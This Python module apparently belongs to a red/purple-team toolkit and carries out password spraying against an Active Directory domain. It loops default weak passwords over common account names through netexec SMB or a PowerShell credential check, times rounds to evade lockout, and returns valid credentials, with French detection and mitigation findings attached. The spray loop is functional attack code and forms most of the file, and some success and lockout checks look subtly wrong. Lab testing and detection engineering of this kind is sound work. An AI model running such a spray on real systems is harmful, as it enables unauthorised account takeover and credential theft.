"""
Red Team — Password Spraying
============================
MITRE ATT&CK: T1110.003 — Brute Force: Password Spraying

Password spraying tests a single common password against many accounts,
avoiding account lockouts by staying under the threshold per account.
This is more effective than brute-forcing a single account and far harder
to detect than traditional brute force attacks.

Attack flow:
    1. Load a list of domain user accounts (from file or defaults)
    2. For each password in the list:
       a. Try authenticating each user with that password
       b. Record successes, failures, and lockouts
       c. Wait spray_delay_s seconds before the next password round
    3. Return valid credentials and attack artifacts

Detection indicators:
    - Event ID 4625: Multiple authentication failures from same source IP
    - Event ID 4740: Account lockout (if threshold is configured)
    - Wazuh Rule 18152: Multiple failed logons

⚠  FOR USE IN ISOLATED LAB ENVIRONMENTS ONLY.
"""

import subprocess
import time
import os
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error, print_step

# ── Attack metadata (used in reports and Purple Team correlation) ──────────────
ATTACK_META = {
    "name":      "Password Spraying",
    "phase":     "Initial Access",
    "mitre":     "T1110.003",
    "risk":      "Élevé",
    "event_ids": [4625, 4648],
    "tools":     ["CrackMapExec", "Kerbrute", "PowerShell"],
    "description": (
        "Un seul mot de passe faible et courant est testé contre une large liste de comptes "
        "du domaine, à un rythme volontairement lent pour rester sous le seuil de "
        "verrouillage de compte. Contrairement au brute force classique, cette lenteur "
        "réduit fortement le risque de blocage tout en maximisant les chances de trouver "
        "un compte mal protégé."
    ),
}

# Default password list — weak/common passwords often found in corporate environments
DEFAULT_PASSWORDS = [
    "Password123!", "Welcome1!", "Company2024!", "Summer2024!",
    "Winter2024!", "Admin123!", "P@ssw0rd", "Azerty123!",
]

# Default user list — common AD account names used when no wordlist file is provided
DEFAULT_USERS = [
    "administrator", "admin", "testuser", "jsmith",
    "john.smith", "svc_backup", "helpdesk",
]


def run_attack(target: str = "domain.local", domain: str = "domain.local",
               user_list: list = None, password_list: list = None,
               delay_s: int = 5, **kwargs) -> dict:
    """
    Execute a password spraying attack against the target domain.

    Tries each password against all users one at a time, with a configurable
    delay between rounds to stay under lockout thresholds.

    Args:
        target        (str)  : DC IP or domain name to authenticate against.
        domain        (str)  : AD domain name (e.g. 'lab.local').
        user_list     (list) : List of usernames to spray. Loaded from file if None.
        password_list (list) : List of passwords to try. Loaded from file if None.
        delay_s       (int)  : Seconds to wait between password rounds (default: 5).

    Returns:
        dict: Standardised result with findings, valid credentials, and artifacts.
    """
    print_warning(f"[RED TEAM] Password Spraying → {target}")

    # Load wordlists from files or fall back to defaults
    users     = user_list     or _load_list("users.txt")    or DEFAULT_USERS
    passwords = password_list or _load_list("passwords.txt") or DEFAULT_PASSWORDS

    print_info(f"{len(users)} account(s) × {len(passwords)} password(s)")

    findings       = []
    valid_creds    = []   # Accounts successfully authenticated
    total_attempts = 0
    locked_out     = []   # Accounts that got locked during the spray

    # Total attempts across all password rounds, for the progress bar.
    # Never shown in the label — only the round number and username — so the
    # password being sprayed isn't exposed on-screen any longer than it
    # already is via the explicit print_info() below.
    total_steps = max(len(passwords) * len(users), 1)
    attempt_num = 0

    # ── Main spray loop ───────────────────────────────────────────────────────
    for round_num, password in enumerate(passwords, 1):
        print_info(f"Spraying with: {password}")
        hits = []

        for user in users:
            attempt_num += 1
            print_step(attempt_num, total_steps, f"round {round_num}/{len(passwords)} — {user}")

            result = _try_auth(domain, user, password, target)
            total_attempts += 1

            if result == "success":
                # Valid credentials found
                hits.append({"user": user, "password": password})
                valid_creds.append({"user": user, "password": password})
                print()  # finish the current progress line before a permanent message
                print_success(f"  ✔ Valid credentials: {user}:{password}")

            elif result == "locked":
                # Account got locked — record it and stop trying this user
                if user not in locked_out:
                    locked_out.append(user)
                    print()  # finish the current progress line before a permanent message
                    print_warning(f"  ! Account locked: {user}")

        # Close the progress bar line before the next round's print_info(),
        # unless this was the last attempt overall (print_step already
        # emitted the trailing newline in that case).
        if attempt_num < total_steps:
            print()

        # Delay between password rounds to avoid triggering lockout policies
        time.sleep(delay_s)

    # ── Build findings ────────────────────────────────────────────────────────
    if valid_creds:
        findings.append({
            "risk":  "Critique",
            "title": f"{len(valid_creds)} valid credential(s) obtained",
            "description": (
                # Password is masked here since this text ends up in the written
                # report; the real value stays available in valid_creds/result
                # artifacts for the operator's own use during the engagement.
                "Compromised accounts: " +
                ", ".join(f"{c['user']}:****" for c in valid_creds[:5])
            ),
            "mitigation": (
                "1. Immediately reset compromised passwords.\n"
                "2. Enable MFA on all accounts.\n"
                "3. Enforce lockout policy (≤10 attempts).\n"
                "4. Deploy Microsoft Entra Password Protection."
            ),
            "mitigation_technique": (
                "1. Implémenter un Account Lockout Policy strict : ≤10 tentatives ratées sur 30 min.\n"
                "2. Configurer un délai de verrouillage ≥30 min.\n"
                "3. Déployer Azure AD Password Protection (listes de mots de passe bannies).\n"
                "4. Activer MFA pour tous les comptes (surtout les admins).\n"
                "5. Surveiller les 4625 en temps réel et déclencher des alertes sur volume anormal."
            ),
            "mitigation_humaine": (
                "1. Sensibiliser tous les utilisateurs à ne pas réutiliser des mots de passe faibles/communs.\n"
                "2. Former l'équipe IT à vérifier la complexité réelle des mots de passe (>12 caractères, mélangé).\n"
                "3. Établir une procédure de réinitialisation immédiate des comptes compromis.\n"
                "4. Mettre en place une formation annuelle obligatoire sur la sécurité des mots de passe.\n"
                "5. Ajouter une astreinte SOC pour investiguer rapidement tout pic de 4625."
            ),
            "impact": (
                f"Accès initial obtenu pour {len(valid_creds)} compte(s) : possibilité de "
                "reconnaissance du réseau, mouvement latéral, escalade de privilèges, exfiltration de données."
            ),
            "logs_siem": [
                {"event_id": 4625, "description": f"{total_attempts} événements d'authentification échouée (spraying pattern)"},
                {"event_id": 4624, "description": f"{len(valid_creds)} authentifications réussies avec credentials faibles"},
                {"rule": "Wazuh 18152", "description": "Multiple failed logons from same IP (si activée)"},
            ],
            "event_ids": [4624, 4625, 4648],
        })

    if locked_out:
        findings.append({
            "risk":  "Moyen",
            "title": f"{len(locked_out)} account(s) locked during the attack",
            "description": "Accounts: " + ", ".join(locked_out),
            "mitigation":  "Lockout policy is active — verify Event ID 4740 alerts in Wazuh.",
            "mitigation_technique": (
                "1. Vérifier que la politique de verrouillage est bien déployée sur tous les domaines.\n"
                "2. Monitorrer les 4740 en temps réel.\n"
                "3. Configurer des alertes automatiques pour débloquer les comptes après X minutes.\n"
                "4. Intégrer la surveillance des lockouts à la procédure d'incident."
            ),
            "mitigation_humaine": (
                "Informer les utilisateurs des risques de verrouillage lors des changements de mot de passe. "
                "Établir une procédure rapide de déverrouillage avec le helpdesk."
            ),
            "impact": f"{len(locked_out)} compte(s) temporairement indisponibles, mais la politique de verrouillage a empêché d'obtenir l'accès.",
            "logs_siem": [
                {"event_id": 4740, "description": f"{len(locked_out)} comptes verrouillés"},
            ],
            "event_ids":   [4740],
        })

    # Always add an informational finding with total attempt count
    findings.append({
        "risk":  "Info",
        "title": f"{total_attempts} authentication attempt(s) generated",
        "description": (
            f"Sprayed {len(users)} accounts with {len(passwords)} passwords. "
            "Each round generates Event ID 4625 entries visible in the SIEM."
        ),
        "mitigation": "Monitor 4625 spikes from a single source IP.",
        "mitigation_technique": (
            "1. Surveiller les pics de 4625 depuis une même IP source.\n"
            "2. Corréler avec les données de géolocalisation des IPs.\n"
            "3. Déclencher une alerte si > 5 comptes différents avec 3+ failures en < 5 min.\n"
            "4. Bloquer l'IP source automatiquement après X tentatives."
        ),
        "mitigation_humaine": (
            "Mettre en place un runbook pour que le SOC réagisse rapidement aux patterns de spray détectés. "
            "Communiquer à l'équipe réseau pour bloquer l'IP source rapidement."
        ),
        "impact": f"{total_attempts} tentatives d'authentification générées, indiquant une phase de reconnaissance/exploitation active.",
        "logs_siem": [
            {"event_id": 4625, "description": f"Volume: {total_attempts} failures"},
        ],
        "event_ids":  [4625],
    })

    return {
        "module":      "red_team.password_spray",
        "status":      "success",
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "valid_credentials": valid_creds,   # Valid user:password pairs
            "locked_accounts":   locked_out,    # Accounts locked during spray
            "total_attempts":    total_attempts,
        },
        "iocs": [
            {"type": "event_id", "value": 4625,
             "description": "Multiple authentication failures (spray pattern)"},
            {"type": "event_id", "value": 4740,
             "description": "Account lockout triggered"},
        ],
        "summary": {
            "users_targeted":    len(users),
            "passwords_tried":   len(passwords),
            "total_attempts":    total_attempts,
            "valid_credentials": len(valid_creds),
            "locked_accounts":   len(locked_out),
        },
    }


# ── Private helpers ───────────────────────────────────────────────────────────

def _try_auth(domain: str, user: str, password: str, target: str) -> str:
    """
    Attempt a single authentication against the target.

    Tries CrackMapExec first (Kali), then falls back to PowerShell (Windows DC).

    Args:
        domain   : AD domain name.
        user     : Username to test.
        password : Password to try.
        target   : Target IP or hostname.

    Returns:
        str: 'success' | 'failed' | 'locked' | 'error'
    """
    # ── Attempt 1: CrackMapExec over SMB ──────────────────────────────────────
    try:
        result = subprocess.run(
            ["netexec", "smb", target, "-u", user, "-p", password, "-d", domain],
            capture_output=True, text=True, timeout=10
        )
        out = result.stdout + result.stderr
        if "[+]" in out and "Pwn3d!" not in out:
            return "success"
        if "STATUS_ACCOUNT_LOCKED_OUT" in out:
            return "locked"
        return "failed"
    except FileNotFoundError:
        pass  # CrackMapExec not installed — try PowerShell fallback

    # ── Attempt 2: PowerShell (Windows domain-joined machine) ─────────────────
    try:
        cmd = (
            f"$pw = ConvertTo-SecureString '{password}' -AsPlainText -Force; "
            f"$cred = New-Object System.Management.Automation.PSCredential"
            f"('{domain}\\{user}', $pw); "
            f"try {{ $null = Get-ADUser -Identity {user} -Credential $cred; 'success' }} "
            f"catch {{ 'failed' }}"
        )
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, text=True, timeout=15
        )
        out = res.stdout.strip().lower()
        if "success" in out: return "success"
        if "locked"  in out: return "locked"
        return "failed"
    except Exception:
        return "error"


def _load_list(filename: str) -> list:
    """
    Load a wordlist from the playbooks/wordlists/ directory.

    Args:
        filename (str): Wordlist filename, e.g. 'users.txt' or 'passwords.txt'.

    Returns:
        list[str]: Lines from the file, or empty list if file not found.
    """
    base = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    path = os.path.join(base, "playbooks", "wordlists", filename)
    if os.path.exists(path):
        with open(path) as f:
            # Skip empty lines and comment lines starting with #
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return []
